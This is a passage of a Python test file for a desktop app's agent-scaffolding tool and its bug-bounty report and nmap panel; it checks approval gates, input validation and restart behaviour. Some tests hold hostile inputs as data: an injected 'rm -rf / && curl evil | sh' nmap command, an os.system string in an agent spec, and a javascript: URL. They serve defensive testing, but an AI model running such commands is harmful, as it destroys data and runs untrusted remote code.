"""Phase 3 workflow-contract tests for Bug Spray and Forge.

Each workflow is checked for: positive path, invalid input, denied consent or
approval (nothing created, nothing contacted), cancel / provider error, and
persist-and-restart. Everything is offline: sockets raise, subprocesses and
QProcess.start are stubbed, model replies are synthetic, and all files go
under tmp_path.
"""

from __future__ import annotations

import json
import socket
import sqlite3
import subprocess
from datetime import UTC, datetime
from pathlib import Path

import pytest

from PySide6.QtCore import QObject, QProcess, Signal
from PySide6.QtWidgets import QApplication, QFileDialog, QLabel, QMessageBox


# ── Offline guard ────────────────────────────────────────────────────────────

@pytest.fixture(autouse=True)
def _offline(monkeypatch):
    def refuse(*a, **k):
        raise AssertionError("network access attempted in a contract test")

    def refuse_proc(*a, **k):
        raise AssertionError("subprocess attempted in a contract test")

    monkeypatch.setattr(socket.socket, "connect", refuse)
    monkeypatch.setattr(socket, "getaddrinfo", refuse)
    monkeypatch.setattr(subprocess, "Popen", refuse_proc)
    monkeypatch.setattr(subprocess, "run", refuse_proc)


@pytest.fixture(scope="module")
def qapp():
    return QApplication.instance() or QApplication([])


# ── Fakes (copied from tests/test_ui_panels.py) ──────────────────────────────

class FakeHost:
    def __init__(self, models=("m1", "m2")):
        self.models = list(models)
        self.loaders = {}
        self.calls = []
        self.agent_instances = {}
        self.authorized = True
        self.agent_factory = None

    def load_models_into(self, provider_box, model_box, context, empty_placeholder=False):
        self.calls.append(("load", provider_box.currentText(), context))
        model_box.clear()
        model_box.addItems([f"{provider_box.currentText()}-{m}" for m in self.models])

    def register_model_loader(self, agent_key, loader):
        self.loaders[agent_key] = loader

    def authorize_request(self, agent, provider, model, prompt,
                          tool=None, label=None, request_id=None):
        self.calls.append(("authorize", agent, provider, model, prompt, tool, label))
        return self.authorized

    def record_request(self, agent, response, messages=None, request_id=None):
        self.calls.append(("record", agent, response, messages))

    def abandon_request(self, agent, reason="error", request_id=None):
        self.calls.append(("abandon", agent, reason))

    def note_request_usage(self, agent, usage, request_id=None):
        self.calls.append(("usage", agent, usage))

    def run_backend(self, backend, model, messages, prompt):
        self.calls.append(("run", backend, model, messages, prompt))
        return "done"

    def _note_failure(self, context, exc, widget=None):
        self.calls.append(("failure", context))

    def show_agent_docs(self):
        self.calls.append(("docs",))

    def count(self, kind):
        return len([c for c in self.calls if c[0] == kind])


class FakeWorker(QObject):
    token_signal = Signal(str)
    finished_signal = Signal(str)
    error_signal = Signal(str)
    usage_signal = Signal(dict)
    status_signal = Signal(str)
    instances = []

    def __init__(self, run_backend, provider, model, messages, prompt):
        super().__init__()
        self.args = (provider, model, messages, prompt)
        self.started = False
        self.cancelled = False
        self.running = True
        FakeWorker.instances.append(self)

    def start(self):
        self.started = True

    def isRunning(self):
        return self.running

    def cancel(self):
        self.cancelled = True


class FakeBugBountyAgent:
    def __init__(self):
        self.calls = []

    def build_messages(self, target, program, scope_type, findings, nmap_output):
        self.calls.append((target, program, scope_type, findings, nmap_output))
        return [{"role": "user", "content": "\n".join(filter(None, [target, findings, nmap_output]))}]


REPORT = (
    "## VULNERABILITY REPORT\n**Severity** High\nCVSS 8.1\n"
    "A bounty of $1,500 is typical.\n"
    "## Proof of Concept\ncurl …\n## Remediation\npatch it\n"
    "## SUBMISSION DRAFT\ndraft text"
)


# ═════════════════════════════════════════════════════════════════════════════
# Forge
# ═════════════════════════════════════════════════════════════════════════════

SPEC = {
    "name": "fw_review",
    "label": "Firewall Review",
    "description": "Reviews firewall logs for anomalies.",
    "allowed_providers": ["ollama"],
    "allowed_tools": ["General Chat"],
    "budget_limit_eur": None,
    "requires_approval": False,
    "system_prompt": "You review firewall logs.",
    "reasoning": "Local only for privacy.",
}


def _build_registry(db_path: Path) -> None:
    conn = sqlite3.connect(db_path)
    conn.executescript(
        """
        CREATE TABLE IF NOT EXISTS agents (
            name TEXT PRIMARY KEY, label TEXT, enabled INTEGER, version TEXT,
            allowed_providers TEXT, allowed_tools TEXT, budget_limit_eur REAL,
            requires_approval INTEGER, description TEXT, log_path TEXT,
            auto_generated INTEGER
        );
        CREATE TABLE IF NOT EXISTS tools (
            name TEXT PRIMARY KEY, label TEXT, enabled INTEGER DEFAULT 1,
            version TEXT DEFAULT '1.0', allowed_providers TEXT DEFAULT '[]',
            budget_limit_eur REAL, requires_approval INTEGER DEFAULT 0,
            description TEXT DEFAULT '', system_prompt TEXT,
            recommended_provider TEXT, recommended_model TEXT
        );
        """
    )
    conn.execute("INSERT OR IGNORE INTO tools (name, label, enabled) "
                 "VALUES ('General Chat', 'General Chat', 1)")
    conn.commit()
    conn.close()


class ForgeEnv:
    """A Forge panel on a REAL AgentFactory rooted in tmp_path."""

    def __init__(self, tmp_path, monkeypatch, qapp):
        from services import agent_factory as af
        from services.agent_factory import AgentFactory
        self.root = tmp_path
        (tmp_path / "agents").mkdir(exist_ok=True)
        self.db = tmp_path / "sentinel.db"
        _build_registry(self.db)

        def connect():
            c = sqlite3.connect(self.db)
            c.row_factory = sqlite3.Row
            return c

        monkeypatch.setattr(af, "get_connection", connect)
        self.AgentFactory = AgentFactory
        self.dialogs = []
        monkeypatch.setattr(QMessageBox, "warning",
                            staticmethod(lambda *a, **k: self.dialogs.append(("warning", a[2]))))
        monkeypatch.setattr(QMessageBox, "information",
                            staticmethod(lambda *a, **k: self.dialogs.append(("info", a[2]))))
        self.answer = QMessageBox.Yes
        monkeypatch.setattr(QMessageBox, "question",
                            staticmethod(lambda *a, **k: self.answer))
        from ui.panels.manager import ManagerPanel
        monkeypatch.setattr(ManagerPanel, "worker_class", FakeWorker)
        FakeWorker.instances.clear()
        self.ManagerPanel = ManagerPanel
        self.open()

    def open(self):
        """(Re)open the app: a fresh factory, host and panel on the same files."""
        self.host = FakeHost()
        self.host.agent_factory = self.AgentFactory(self.root)
        self.panel = self.ManagerPanel(self.host)
        self.panel.idea_input.setPlainText("An agent that reviews firewall logs")
        return self.panel

    def propose(self, spec_or_text):
        text = spec_or_text if isinstance(spec_or_text, str) else json.dumps(spec_or_text)
        self.panel.analyze_idea()
        worker = self.panel.worker
        worker.running = False                          # the request is over
        worker.finished_signal.emit(text)

    def files(self):
        return sorted(p.name for p in (self.root / "agents").iterdir())

    def rows(self, table):
        with sqlite3.connect(self.db) as conn:
            return conn.execute(f"SELECT * FROM {table} ORDER BY name").fetchall()

    def card_text(self):
        return " ".join(l.text() for l in self.panel.sections.findChildren(QLabel))


@pytest.fixture
def forge(tmp_path, monkeypatch, qapp):
    return ForgeEnv(tmp_path, monkeypatch, qapp)


class TestForgeDescribeToCreate:
    # (1) positive
    def test_describe_proposal_approve_creates_a_disabled_agent(self, forge):
        forge.propose(SPEC)
        assert "Firewall Review" in forge.card_text()
        assert "Providers: ollama" in forge.card_text()
        assert forge.panel.approve_btn.isEnabled()
        assert forge.files() == []                      # a proposal writes nothing
        forge.panel.approve_btn.click()
        assert forge.files() == ["fw_review_agent.py"]
        src = (forge.root / "agents" / "fw_review_agent.py").read_text()
        compile(src, "x", "exec")
        agent_row = forge.rows("agents")[0]
        assert agent_row[0] == "fw_review" and agent_row[2] == 0 and agent_row[10] == 1
        assert [r[0] for r in forge.rows("tools")] == ["Firewall Review", "General Chat"]
        assert forge.rows("tools")[0][2] == 0           # tool row disabled too
        assert forge.panel.pending_spec is None
        assert not forge.panel.approve_btn.isEnabled()
        assert "[Created]" in forge.panel.log.toPlainText()

    def test_the_request_is_sent_with_the_idea_not_a_spec(self, forge):
        forge.panel.analyze_idea()
        msgs = forge.panel.worker.args[2]
        assert "reviews firewall logs" in msgs[-1]["content"]
        assert forge.host.count("authorize") == 1

    def test_a_fenced_reply_with_prose_is_still_a_proposal(self, forge):
        forge.propose("Sure! Here you go:\n```json\n" + json.dumps(SPEC) + "\n```\nHope it helps {x}")
        assert forge.panel.pending_spec["name"] == "fw_review"
        assert forge.panel.approve_btn.isEnabled()

    # (2) invalid input
    @pytest.mark.parametrize("name", ["chat", "manager", "../escape", "Bad Name", "", "9lives"])
    def test_invalid_names_show_the_invalid_card_and_cannot_be_approved(self, forge, name):
        forge.propose(dict(SPEC, name=name))
        assert "[Invalid]" in forge.panel.log.toPlainText()
        assert "Cannot be created as written" in forge.card_text()
        assert not forge.panel.approve_btn.isEnabled()
        assert forge.panel.reject_btn.isEnabled()
        forge.panel.approve_btn.click()                 # disabled: no effect
        forge.panel.approve_spec()                      # called directly: the factory refuses
        assert forge.files() == [] and forge.rows("agents") == []

    def test_unknown_provider_and_tool_are_invalid_before_approval(self, forge):
        forge.propose(dict(SPEC, allowed_providers=["skynet"]))
        assert "Unsupported providers" in forge.panel.log.toPlainText()
        forge.propose(dict(SPEC, allowed_tools=["Nuke Everything"]))
        assert "Unknown tools" in forge.panel.log.toPlainText()
        assert forge.files() == []

    def test_negative_budget_is_invalid(self, forge):
        forge.propose(dict(SPEC, budget_limit_eur=-5))
        assert not forge.panel.approve_btn.isEnabled()
        assert "budget_limit_eur" in forge.panel.log.toPlainText()

    def test_missing_fields_are_invalid_and_named(self, forge):
        forge.propose({"name": "half", "label": "Half"})
        assert "missing required fields" in forge.panel.log.toPlainText()
        assert forge.files() == []

    def test_non_json_reply_gives_no_proposal_and_creates_nothing(self, forge):
        forge.propose("I cannot help with that.")
        assert forge.panel.pending_spec is None
        assert not forge.panel.approve_btn.isEnabled()
        assert "Could not structure" in forge.card_text()
        forge.panel.approve_spec()
        assert forge.files() == []

    def test_a_bare_json_scalar_reply_is_not_a_spec(self, forge):
        forge.propose('42')
        assert forge.panel.pending_spec is None

    def test_hostile_text_in_the_spec_stays_a_literal_in_the_scaffold(self, forge):
        evil = dict(SPEC, description='"""\nimport os; os.system("x")\n"""',
                    system_prompt="a\\")
        forge.propose(evil)
        forge.panel.approve_spec()
        src = (forge.root / "agents" / "fw_review_agent.py").read_text()
        ns = {}
        exec(compile(src, "x", "exec"), ns)             # defines a class only; no side effects
        assert "os" not in ns

    # (3) denied approval
    def test_declining_the_confirmation_creates_nothing_and_keeps_the_proposal(self, forge):
        forge.answer = QMessageBox.No
        forge.propose(SPEC)
        forge.panel.approve_btn.click()
        assert forge.files() == [] and forge.rows("agents") == []
        assert [r[0] for r in forge.rows("tools")] == ["General Chat"]
        assert forge.panel.pending_spec is not None
        assert forge.panel.approve_btn.isEnabled()
        assert "[Created]" not in forge.panel.log.toPlainText()

    def test_declined_then_accepted_creates_exactly_once(self, forge):
        forge.answer = QMessageBox.No
        forge.propose(SPEC)
        forge.panel.approve_spec()
        forge.answer = QMessageBox.Yes
        forge.panel.approve_spec()
        forge.panel.approve_spec()                      # a double click
        assert len(forge.rows("agents")) == 1
        assert forge.files() == ["fw_review_agent.py"]

    def test_reject_clears_everything_and_creates_nothing(self, forge):
        forge.propose(SPEC)
        forge.panel.reject_btn.click()
        assert forge.panel.pending_spec is None
        assert not forge.panel.approve_btn.isEnabled()
        assert not forge.panel.reject_btn.isEnabled()
        assert "[Rejected]" in forge.panel.log.toPlainText()
        forge.panel.approve_spec()
        assert forge.files() == [] and forge.rows("agents") == []

    def test_a_blocked_request_contacts_no_model_and_creates_nothing(self, forge):
        forge.host.authorized = False
        forge.panel.analyze_idea()
        assert FakeWorker.instances == []
        assert forge.panel.pending_spec is None
        assert forge.files() == []

    def test_a_new_analysis_discards_the_previous_pending_spec(self, forge):
        forge.propose(SPEC)
        forge.panel.analyze_idea()                       # second request starts
        assert forge.panel.pending_spec is None
        assert not forge.panel.approve_btn.isEnabled()
        forge.panel.approve_spec()
        assert forge.files() == []

    # (4) cancel / provider error
    def test_provider_error_mid_stream_leaves_nothing_approvable(self, forge):
        forge.panel.analyze_idea()
        forge.panel.worker.token_signal.emit('{"name": "fw_rev')
        forge.panel.worker.error_signal.emit("provider down")
        assert forge.panel.pending_spec is None
        assert not forge.panel.approve_btn.isEnabled()
        assert ("abandon", "manager", "error") in forge.host.calls
        assert "[Error] provider down" in forge.panel.log.toPlainText()
        forge.panel.approve_spec()
        assert forge.files() == []

    def test_error_after_a_proposal_cannot_resurrect_approval(self, forge):
        forge.propose(SPEC)
        forge.panel.analyze_idea()
        forge.panel.worker.error_signal.emit("429 rate limited")
        forge.panel.approve_spec()
        assert forge.files() == [] and forge.rows("agents") == []

    def test_stop_mid_stream_then_cancel_error_creates_nothing(self, forge):
        forge.panel.analyze_idea()
        worker = forge.panel.worker
        worker.token_signal.emit("{")
        forge.panel.stop()
        worker.error_signal.emit("Request cancelled by user.")   # what ChatWorker does
        assert worker.cancelled
        assert forge.panel.analyze_btn.isEnabled()
        assert forge.panel.pending_spec is None
        assert forge.files() == []

    def test_stop_with_nothing_running_is_harmless(self, forge):
        forge.panel.stop()
        assert "[Stopped]" not in forge.panel.log.toPlainText()
        assert forge.panel.analyze_btn.isEnabled()

    def test_a_factory_failure_at_approval_rolls_everything_back(self, forge, monkeypatch):
        from services import agent_factory as af
        forge.propose(SPEC)
        monkeypatch.setattr(af.AgentFactory, "_update_tool_registry",
                            lambda *a, **k: (_ for _ in ()).throw(RuntimeError("db locked")))
        forge.panel.approve_spec()
        assert "[Failed]" in forge.panel.log.toPlainText()
        assert forge.files() == [] and forge.rows("agents") == []
        assert forge.panel.pending_spec is not None       # reviewer can retry
        assert forge.panel.approve_btn.isEnabled()

    # (5) persist and restart
    def test_created_agent_is_in_the_registry_after_reopening(self, forge):
        forge.propose(SPEC)
        forge.panel.approve_spec()
        forge.panel.deleteLater()
        panel = forge.open()                              # "restart"
        assert panel.pending_spec is None and not panel.approve_btn.isEnabled()
        assert forge.files() == ["fw_review_agent.py"]
        row = forge.rows("agents")[0]
        assert row[0] == "fw_review" and json.loads(row[4]) == ["ollama"]
        assert json.loads(row[5]) == ["General Chat"]

    def test_after_restart_proposing_the_same_agent_is_invalid(self, forge):
        forge.propose(SPEC)
        forge.panel.approve_spec()
        forge.open()
        forge.propose(SPEC)
        assert "[Invalid]" in forge.panel.log.toPlainText()
        assert not forge.panel.approve_btn.isEnabled()
        assert len(forge.rows("agents")) == 1

    def test_after_restart_the_same_label_with_a_new_name_is_still_refused(self, forge):
        forge.propose(SPEC)
        forge.panel.approve_spec()
        forge.open()
        forge.propose(dict(SPEC, name="other_name"))
        assert not forge.panel.approve_btn.isEnabled()

    def test_a_rejected_proposal_leaves_no_trace_after_restart(self, forge):
        forge.propose(SPEC)
        forge.panel.reject_spec()
        forge.open()
        forge.propose(SPEC)
        assert forge.panel.approve_btn.isEnabled()        # name still free
        assert forge.files() == []


# ═════════════════════════════════════════════════════════════════════════════
# Bug Spray — analysis, nmap, Stop
# ═════════════════════════════════════════════════════════════════════════════

@pytest.fixture
def started(monkeypatch):
    """Record QProcess.start instead of ever launching anything."""
    calls = []
    monkeypatch.setattr(QProcess, "start",
                        lambda self, program, args=None, *a: calls.append((program, list(args or []))))
    return calls


@pytest.fixture
def spray(qapp, tmp_path, monkeypatch, started):
    from agents.bug_spray.bug_spray import config
    from ui.panels.bug_bounty import BugBountyPanel
    import ui.panels.bug_spray_feed as feed_module

    settings = config.Settings(enabled_platforms=[], data_dir=str(tmp_path / "feed"))
    monkeypatch.setattr(config, "load", lambda path=None: settings)
    monkeypatch.setattr(feed_module, "PYTHON", tmp_path / "no-python")
    monkeypatch.setattr(BugBountyPanel, "worker_class", FakeWorker)
    FakeWorker.instances.clear()
    host = FakeHost()
    host.agent_instances["bug_bounty"] = FakeBugBountyAgent()
    panel = BugBountyPanel(host)
    panel.target_input.setText("https://target.example.com/app")
    yield panel
    panel.deleteLater()


class TestBugSprayAnalyse:
    # (1) positive
    def test_analyse_authorises_then_runs_and_fills_the_report(self, spray):
        spray.analyse()
        assert spray.host.count("authorize") == 1
        assert len(FakeWorker.instances) == 1 and FakeWorker.instances[0].started
        spray.worker.finished_signal.emit(REPORT)
        assert (spray.severity_label.text(), spray.cvss_label.text()) == ("High", "8.1")
        assert spray.save_btn.isEnabled()
        assert spray.host.count("record") == 1

    def test_findings_alone_are_enough_to_analyse(self, spray):
        spray.target_input.clear()
        spray.findings_input.setPlainText("verbose stack trace on /debug")
        spray.analyse()
        assert len(FakeWorker.instances) == 1
        assert [c for c in spray.host.calls if c[0] == "authorize"][0][6] == "bug_bounty"

    # (2) invalid input
    def test_whitespace_only_input_sends_nothing(self, spray):
        spray.target_input.setText("   ")
        spray.findings_input.setPlainText("\n \t")
        spray.analyse()
        assert "Enter a target" in spray.status_label.text()
        assert spray.host.count("authorize") == 0 and FakeWorker.instances == []

    def test_an_unlabelled_scope_claim_is_not_trusted_as_authorisation(self, spray):
        # The panel states that program/scope are declared, not verified. A
        # target that is not in the selected program's scope must still go
        # through the normal budget guard and nothing is skipped.
        spray.program_input.setText("HackerOne — Acme")
        spray.target_input.setText("https://not-in-scope.invalid")
        spray.analyse()
        assert spray.host.count("authorize") == 1

    def test_a_report_without_the_expected_headings_never_crashes_the_parser(self, spray):
        for junk in ("", "##", "**Severity**", "CVSS", "bounty $", "## SUBMISSION DRAFT"):
            spray.analyse()
            worker = spray.worker
            worker.running = False
            worker.finished_signal.emit(junk)
        assert spray.status_label.text() == "Analysis complete."

    # (3) denied consent
    def test_a_blocked_request_reaches_no_model_and_keeps_old_output_cleared(self, spray):
        spray.host.authorized = False
        spray.analyse()
        assert FakeWorker.instances == []
        assert spray.status_label.text() == "Blocked before sending."
        assert spray.analyse_btn.isEnabled() and not spray.stop_btn.isEnabled()
        assert spray.host.count("record") == 0

    def test_a_blocked_request_with_scan_output_still_sends_nothing(self, spray):
        spray._nmap_scan_text = "22/tcp open ssh"
        spray.host.authorized = False
        spray.analyse()
        assert FakeWorker.instances == [] and spray.host.count("run") == 0

    # (4) error / cancel
    def test_error_after_a_good_report_disables_save_and_resets_indicators(self, spray):
        spray.analyse()
        spray.worker.finished_signal.emit(REPORT)
        spray.analyse()
        spray.worker.token_signal.emit("## VULN")
        spray.worker.error_signal.emit("timeout")
        assert not spray.save_btn.isEnabled()
        assert spray.severity_label.text() == "—"
        assert spray.status_label.text() == "Error."
        assert ("abandon", "bug_bounty", "error") in spray.host.calls
        assert spray.host.count("record") == 1            # only the good one

    def test_stop_then_cancel_error_leaves_a_usable_panel(self, spray):
        spray.analyse()
        worker = spray.worker
        spray.stop()
        worker.error_signal.emit("Request cancelled by user.")
        assert worker.cancelled
        assert spray.analyse_btn.isEnabled() and not spray.stop_btn.isEnabled()
        assert not spray.save_btn.isEnabled()
        spray.worker.running = False
        spray.analyse()                                    # can run again
        assert len(FakeWorker.instances) == 2

    def test_stop_does_not_kill_a_running_scan(self, spray):
        class Proc:
            killed = False
            def kill(self): self.killed = True
        proc = Proc()
        spray._nmap_process = proc
        spray.analyse()
        spray.stop()
        assert proc.killed is False

    def test_stop_with_nothing_running_does_not_raise(self, spray):
        spray.stop()
        assert spray.analyse_btn.isEnabled()

    # (5) persist
    def test_saved_report_is_written_where_the_user_chose(self, spray, tmp_path, monkeypatch):
        out = tmp_path / "out.md"
        monkeypatch.setattr(QFileDialog, "getSaveFileName",
                            staticmethod(lambda *a, **k: (str(out), "")))
        spray.analyse()
        spray.worker.finished_signal.emit(REPORT)
        spray.save()
        assert out.read_text(encoding="utf-8") == REPORT

    def test_cancelling_the_save_dialog_writes_nothing(self, spray, tmp_path, monkeypatch):
        monkeypatch.setattr(QFileDialog, "getSaveFileName",
                            staticmethod(lambda *a, **k: ("", "")))
        spray.analyse()
        spray.worker.finished_signal.emit(REPORT)
        spray.save()
        assert list(tmp_path.glob("*.md")) == []

    def test_saving_with_no_report_opens_no_dialog(self, spray, monkeypatch):
        def boom(*a, **k):
            raise AssertionError("dialog opened")
        monkeypatch.setattr(QFileDialog, "getSaveFileName", staticmethod(boom))
        spray.save()


class TestBugSprayNmap:
    @pytest.fixture(autouse=True)
    def _nmap_present(self, monkeypatch):
        monkeypatch.setattr("ui.panels.bug_bounty.shutil.which", lambda n: "/usr/bin/nmap")

    # (1) positive
    def test_target_url_becomes_a_host_only_scan_command(self, spray, started):
        spray.run_nmap()
        assert spray.nmap_cmd_input.text() == "nmap -sV -sC -T4 --open target.example.com"
        assert started == [("/usr/bin/nmap", ["-sV", "-sC", "-T4", "--open", "target.example.com"])]
        assert not spray.nmap_run_btn.isEnabled() and spray.nmap_stop_btn.isEnabled()
        assert spray.host.count("authorize") == 0         # local, unpaid

    def test_scan_text_is_what_analyse_sends(self, spray, started):
        spray.run_nmap()
        spray._nmap_process.readAll = lambda: type("B", (), {"data": lambda s: b"80/tcp open http\n"})()
        spray._nmap_read()
        spray._nmap_finished(0)
        spray.analyse()
        assert spray.host.agent_instances["bug_bounty"].calls[-1][4] == "80/tcp open http"

    # (2) invalid input
    @pytest.mark.parametrize("cmd", ["nmap 'unterminated", "", "   "])
    def test_malformed_command_starts_nothing(self, spray, started, cmd):
        spray.target_input.clear()
        spray.nmap_cmd_input.setText(cmd)
        spray.run_nmap()
        assert started == [] and spray._nmap_process is None
        assert spray.nmap_run_btn.isEnabled()

    def test_shell_metacharacters_are_never_interpreted(self, spray, started):
        spray.nmap_cmd_input.setText("nmap -sV 10.0.0.1; rm -rf / && curl evil | sh")
        spray.run_nmap()
        program, args = started[0]
        assert program == "/usr/bin/nmap"                  # still only nmap
        assert "10.0.0.1;" in args                         # literal argv, no shell

    def test_other_programs_are_refused(self, spray, started):
        spray.nmap_cmd_input.setText("/bin/sh -c nmap")
        spray.run_nmap()
        assert started == [] and "Only nmap" in spray.nmap_output.toPlainText()

    # (3) denied: nmap unavailable => nothing launched
    def test_missing_binary_launches_nothing(self, spray, started, monkeypatch):
        monkeypatch.setattr("ui.panels.bug_bounty.shutil.which", lambda n: None)
        monkeypatch.setattr("ui.panels.bug_bounty.Path.is_file", lambda self: False)
        spray.run_nmap()
        assert started == [] and "not installed" in spray.nmap_output.toPlainText()

    # (4) cancel / failure
    def test_kill_stops_the_process_and_frees_the_buttons(self, spray, started):
        spray.run_nmap()
        killed = []
        spray._nmap_process.kill = lambda: killed.append(1)
        spray.kill_nmap()
        assert killed and spray.nmap_run_btn.isEnabled() and not spray.nmap_stop_btn.isEnabled()

    def test_nonzero_exit_is_reported(self, spray, started):
        spray.run_nmap()
        spray._nmap_finished(1)
        assert "nmap exited 1" in spray.nmap_output.toPlainText()
        assert spray.nmap_run_btn.isEnabled()

    def test_timeout_kills_a_running_scan(self, spray, started):
        spray.run_nmap()
        killed = []
        spray._nmap_process.state = lambda: QProcess.Running
        spray._nmap_process.kill = lambda: killed.append(1)
        spray._nmap_timed_out()
        assert killed and "Scan stopped after" in spray.nmap_output.toPlainText()

    # (5) persist
    def test_scan_output_survives_until_clear(self, spray, started):
        spray._nmap_scan_text = "443/tcp open https"
        spray.analyse()
        assert spray.host.agent_instances["bug_bounty"].calls[-1][4] == "443/tcp open https"
        spray.clear()
        assert spray.nmap_scan_text == ""


# ═════════════════════════════════════════════════════════════════════════════
# Bug Spray — program feed
# ═════════════════════════════════════════════════════════════════════════════

@pytest.fixture
def feed_env(qapp, tmp_path, monkeypatch, started):
    from agents.bug_spray.bug_spray import config
    from agents.bug_spray.bug_spray.models import Program, RewardTier, Scope
    from agents.bug_spray.bug_spray.store import Store
    import ui.panels.bug_spray_feed as feed_module

    class Env:
        pass

    env = Env()
    env.tmp = tmp_path
    env.settings = config.Settings(enabled_platforms=["hackerone"], data_dir=str(tmp_path / "d"))
    env.config = config
    env.module = feed_module
    env.Store, env.Program, env.Scope, env.Tier = Store, Program, Scope, RewardTier
    env.started = started
    env.widgets = []
    monkeypatch.setattr(config, "load", lambda path=None: env.settings)
    monkeypatch.setattr(feed_module, "PYTHON", tmp_path / "py")
    (tmp_path / "py").touch()

    def seed(in_scope=("api.acme.test",), out=(), scanned=None, name="Acme", slug="acme"):
        db = Store(env.settings.db_path)
        db.record(Program("hackerone", slug, name, f"https://hackerone.com/{slug}", True,
                          Scope(in_scope=list(in_scope), out_of_scope=list(out)),
                          [RewardTier("high", 100, 500, "USD")]))
        db.record_scan((scanned or datetime.now(UTC)).isoformat(), {"hackerone": {"programs": 1}}, [])
        db.close()
    env.seed = seed

    def make():
        w = feed_module.BugSprayFeed()
        env.widgets.append(w)
        return w
    env.make = make
    yield env
    for w in env.widgets:
        w.deleteLater()


class TestBugSprayFeed:
    # (1) positive
    def test_refresh_lists_the_saved_program_and_scan_time(self, feed_env):
        feed_env.seed()
        feed = feed_env.make()
        feed.refresh()
        assert feed.programs.topLevelItemCount() == 1
        assert "Last scan:" in feed.status.text() and "never" not in feed.status.text()

    def test_change_events_appear_with_their_labels(self, feed_env):
        feed_env.seed()
        conn = sqlite3.connect(feed_env.settings.db_path)
        conn.execute("INSERT INTO change_events (scanned_at, platform, slug, payload) VALUES (?,?,?,?)",
                     (datetime.now(UTC).isoformat(), "hackerone", "acme", json.dumps(
                         {"program": {"platform": "hackerone", "slug": "acme", "name": "Acme"},
                          "new": True, "scope_added": ["a", "b"], "scope_removed": []})))
        conn.commit()
        conn.close()
        feed = feed_env.make()
        feed.refresh()
        assert feed.changes.topLevelItemCount() == 1
        assert feed.changes.topLevelItem(0).text(1) == "New, Scope +2/-0"
        assert feed.tabs.tabText(0) == "Recent changes (1)"

    # (2) invalid input
    def test_no_database_yet_says_never_and_lists_nothing(self, feed_env):
        feed = feed_env.make()
        feed.refresh()
        assert feed.programs.topLevelItemCount() == 0 and "never" in feed.status.text()

    def test_corrupt_database_is_reported_not_raised(self, feed_env):
        feed_env.settings.db_path.parent.mkdir(parents=True, exist_ok=True)
        feed_env.settings.db_path.write_bytes(b"this is not sqlite" * 50)
        feed = feed_env.make()
        feed.refresh()
        assert "Program feed unavailable" in feed.status.text()

    def test_invalid_settings_are_reported_not_raised(self, feed_env):
        from dataclasses import replace
        feed_env.settings = replace(feed_env.settings, poll_interval_minutes=0)
        feed = feed_env.make()
        feed.refresh()
        assert "Program feed unavailable" in feed.status.text()
        assert "poll_interval_minutes" in feed.status.text()

    def test_unpublished_scope_is_labelled_and_saved_scope_is_never_authorisation(self, feed_env):
        feed_env.seed(in_scope=())
        feed = feed_env.make()
        feed.refresh()
        assert feed.programs.topLevelItem(0).text(3) == "unpublished"
        feed.programs.setCurrentItem(feed.programs.topLevelItem(0))
        assert "not public" in feed.details.toPlainText()
        assert "not authorization" in feed.details.toPlainText()

    def test_out_of_scope_assets_are_listed(self, feed_env):
        feed_env.seed(out=("legacy.acme.test",))
        feed = feed_env.make()
        feed.refresh()
        feed.programs.setCurrentItem(feed.programs.topLevelItem(0))
        assert "legacy.acme.test" in feed.details.toPlainText()

    # (3) denied: nothing contacted
    def test_no_enabled_platform_means_no_scan_is_ever_started(self, feed_env):
        from dataclasses import replace
        feed_env.settings = replace(feed_env.settings, enabled_platforms=[])
        feed = feed_env.make()
        feed.refresh()
        feed._maybe_scan()
        assert feed_env.started == []

    def test_a_fresh_scan_is_not_repeated_on_open(self, feed_env):
        feed_env.seed()
        feed = feed_env.make()
        feed.refresh()
        feed._maybe_scan()
        assert feed_env.started == []

    def test_missing_scanner_environment_starts_no_process(self, feed_env):
        feed_env.module.PYTHON = feed_env.tmp / "missing"
        feed = feed_env.make()
        feed.scan_now()
        assert feed_env.started == [] and "environment is missing" in feed.status.text()
        assert feed.scan_button.isEnabled()

    def test_non_https_program_page_is_never_opened(self, feed_env, monkeypatch):
        opened = []
        monkeypatch.setattr(feed_env.module.QDesktopServices, "openUrl",
                            staticmethod(lambda url: opened.append(url.toString())))
        db = feed_env.Store(feed_env.settings.db_path)
        db.record(feed_env.Program("hackerone", "evil", "Evil", "javascript:alert(1)", True,
                                   feed_env.Scope(in_scope=["x"]), []))
        db.close()
        feed = feed_env.make()
        feed.refresh()
        feed.programs.setCurrentItem(feed.programs.topLevelItem(0))
        assert not feed.open_button.isEnabled()
        feed.open_program()
        assert opened == []

    def test_use_in_report_with_no_selection_emits_nothing(self, feed_env):
        feed_env.seed()
        feed = feed_env.make()
        feed.refresh()
        got = []
        feed.program_selected.connect(got.append)
        feed.use_program()
        assert got == []

    # (4) cancel / error
    def test_scan_start_failure_re_enables_the_button_and_says_why(self, feed_env):
        feed = feed_env.make()
        feed.scan_button.setEnabled(False)
        feed._scan_error(QProcess.FailedToStart)
        assert feed.scan_button.isEnabled()
        assert "Could not start Bug Spray scan" in feed.status.text()

    def test_failed_scan_exit_is_surfaced_with_stderr(self, feed_env):
        feed_env.seed()
        feed = feed_env.make()
        feed._scan_stderr = "boom: HTTP 500"
        feed._scan_finished(2, None)
        assert "Scan finished with errors" in feed.status.text()
        assert feed.scan_button.isEnabled()

    def test_a_scan_in_progress_is_not_started_twice(self, feed_env, monkeypatch):
        feed = feed_env.make()
        monkeypatch.setattr(feed._scan, "state", lambda: QProcess.Running)
        feed.scan_now()
        assert feed_env.started == []

    def test_platform_errors_from_the_last_scan_are_shown(self, feed_env):
        db = feed_env.Store(feed_env.settings.db_path)
        db.record_scan(datetime.now(UTC).isoformat(), {"hackerone": {"error": "403"}}, [])
        db.close()
        feed = feed_env.make()
        feed.refresh()
        assert "errors: hackerone" in feed.status.text()

    # (5) persist and restart
    def test_feed_items_survive_reopening_the_widget_and_the_store(self, feed_env):
        feed_env.seed()
        first = feed_env.make()
        first.refresh()
        first.deleteLater()
        feed_env.seed(name="Beta", slug="beta")
        second = feed_env.make()                          # "restart"
        second.refresh()
        names = sorted(second.programs.topLevelItem(i).text(0)
                       for i in range(second.programs.topLevelItemCount()))
        assert names == ["Acme", "Beta"]
        assert second.tabs.tabText(1) == "Programs (2)"

    def test_a_selected_program_fills_the_report_after_restart(self, feed_env):
        feed_env.seed()
        feed = feed_env.make()
        feed.refresh()
        got = []
        feed.program_selected.connect(got.append)
        feed.programs.setCurrentItem(feed.programs.topLevelItem(0))
        feed.use_program()
        assert got == ["Hackerone — Acme"]

    def test_filter_changes_persist_nothing_and_loosening_loses_nothing(self, feed_env):
        from dataclasses import replace
